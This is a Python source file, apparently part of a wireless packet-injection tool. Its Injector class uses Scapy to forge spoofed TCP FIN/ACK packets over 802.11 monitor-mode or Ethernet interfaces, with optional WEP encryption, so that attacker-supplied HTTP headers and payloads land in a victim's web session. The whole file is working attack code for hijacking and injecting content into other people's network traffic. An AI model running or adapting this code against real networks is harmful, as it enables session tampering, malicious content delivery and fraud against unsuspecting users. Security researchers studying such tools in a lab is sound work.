from lib.headers import Headers
from lib.visuals import Bcolors
from binascii import unhexlify
from pyDot11 import *
import fcntl, socket, struct, sys, time

global npackets
npackets = 0

class Injector(object):
    """Uses scapy to inject packets on the networks"""
    
    def __init__(self, interface):
        self.interface = interface
        rTap = '00 00 26 00 2f 40 00 a0 20 08 00 a0 20 08 00 00 20 c8 af c8 00 00 00 00 10 6c 85 09 c0 00 d3 00 00 00 d2 00 cd 01'
        self.RadioTap = RadioTap(unhexlify(rTap.replace(' ', '')))
        

    def getHwAddr(self, ifname):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', ifname[:15]))
        mac = ':'.join(['%02x' % ord(char) for char in info[18:24]])
        return mac

    ### No longer in use
    #def float_to_hex(self,f):
        #return hex(struct.unpack('<I', struct.pack('<f', f))[0])


    def inject(self,
               vicmac,
               rtrmac,
               vicip,
               svrip,
               vicport,
               svrport,
               acknum,
               seqnum,
               injection,
               TSVal,
               TSecr,
               args):
        """Send the injection using Scapy
        
        This method is where the actual packet is created for sending
        Things such as payload and associated flags are genned here
        FIN/ACK flag is sent to the victim with this method
        """
        global npackets
        npackets += 1
        sys.stdout.write(Bcolors.OKBLUE + '[*] Injecting Packet to victim ' + Bcolors.WARNING + vicmac + Bcolors.OKBLUE + ' (TOTAL: ' + str(npackets) + ' injected packets)\r' + Bcolors.ENDC)
        sys.stdout.flush()
        if 'mon' in self.interface:
            hdr = Headers()
            headers = hdr.default(injection)

            ## pyDot11
            if args.p:
                packet = self.RadioTap\
                        /Dot11(
                              FCfield = 'from-DS',
                              addr1 = vicmac,
                              addr2 = rtrmac,
                              addr3 = rtrmac,
                              subtype = 8L,
                              type = 2
                              )\
                        /Dot11QoS()\
                        /LLC()\
                        /SNAP()\
                        /IP(
                           dst = vicip,
                           src = svrip
                           )\
                        /TCP(
                            flags = 'FA',
                            sport = int(svrport),
                            dport = int(vicport),
                            seq = int(seqnum),
                            ack = int(acknum)
                            )\
                        /Raw(
                            load = headers + injection
                            )
            else:
                packet = RadioTap()\
                        /Dot11(
                              FCfield = 'from-DS',
                              addr1 = vicmac,
                              addr2 = rtrmac,
                              addr3 = rtrmac
                              )\
                        /LLC()\
                        /SNAP()\
                        /IP(
                           dst = vicip,
                           src = svrip
                           )\
                        /TCP(
                            flags = 'FA',
                            sport = int(svrport),
                            dport = int(vicport),
                            seq = int(seqnum),
                            ack = int(acknum)
                            )\
                        /Raw(
                            load = headers + injection
                            )
                    
            if TSVal is not None and TSecr is not None:
                packet[TCP].options = [
                                      ('NOP', None),
                                      ('NOP', None),
                                      ('Timestamp',
                                      ((round(time.time()), TSVal)))
                                      ]
            else:
                packet[TCP].options = [
                                      ('NOP', None),
                                      ('NOP', None),
                                      ('Timestamp',
                                      ((round(time.time()), 0)))
                                      ]

            if args.p:
                #wrpcap('before.pcap', packet)
                packet = wepEncrypt(packet, args.w)
                #wrpcap('after.pcap', packet)

            try:
                sendp(packet, iface = self.interface, verbose = 0)
            except:
                pass

            ### Single packet exit point
            if args.single:
                sys.stdout.write(Bcolors.OKBLUE + '[*] Injecting Packet to victim ' + Bcolors.WARNING + vicmac + Bcolors.OKBLUE + ' (TOTAL: ' + str(npackets) + ' injected packets)\r' + Bcolors.ENDC)
                sys.exit(0)
        else:
            hdr = Headers()
            headers = hdr.default(injection)
            
            ### Nasty quick&dirty PoC for pyDot11
            ### WARN, THIS IS NOT SET PROPER YET, DISREGARDING FOR NOW, DO NOT USE THIS SECTIOn
            if args.p:
                packet = RadioTap()\
                        /Dot11(
                              FCfield = 'from-DS',
                              addr1 = vicmac,
                              addr2 = rtrmac,
                              addr3 = rtrmac
                              )\
                        /LLC()\
                        /SNAP()\
                        /IP(
                           dst = vicip,
                           src = svrip
                           )\
                        /TCP(
                            flags = "FA",
                            sport = int(svrport),
                            dport = int(vicport),
                            seq = int(seqnum),
                            ack = int(acknum)
                            )\
                        /Raw(
                            load = headers + injection
                            )\
                        
                if TSVal is not None:
                    packet[TCP].options = [
                                          ('NOP', None),
                                          ('NOP', None),
                                          ('Timestamp',
                                          ((round(time.time()), TSVal)))
                                          ]
                else:
                    packet[TCP].options = [
                                          ('NOP', None),
                                          ('NOP', None),
                                          ('Timestamp',
                                          ((round(time.time()), 0)))
                                          ]

                packet = wepEncrypt(packet, args.w)
                        
                
            else:
                packet = Ether(
                              src = self.getHwAddr(self.interface),
                              dst = vicmac
                              )\
                        /IP(
                           dst = vicip,
                           src = svrip
                           )\
                        /TCP(
                            flags = 'FA',
                            sport = int(svrport),
                            dport = int(vicport),
                            seq = int(seqnum),
                            ack = int(acknum)
                            )\
                        /Raw(
                            load = headers + injection
                            )\

                if TSVal is not None:
                    packet[TCP].options = [
                                          ('NOP', None),
                                          ('NOP', None),
                                          ('Timestamp',
                                          ((round(time.time()), TSVal)))
                                          ]
                else:
                    packet[TCP].options = [
                                          ('NOP', None),
                                          ('NOP', None),
                                          ('Timestamp',
                                          ((round(time.time()), 0)))
                                          ]

            try:
                ### pyDot11 hack
                if args.p:
                    sendp(packet, iface = args.i, verbose = 0)
                else:
                    sendp(packet, iface = self.interface, verbose = 0)
            except:
                pass

            return
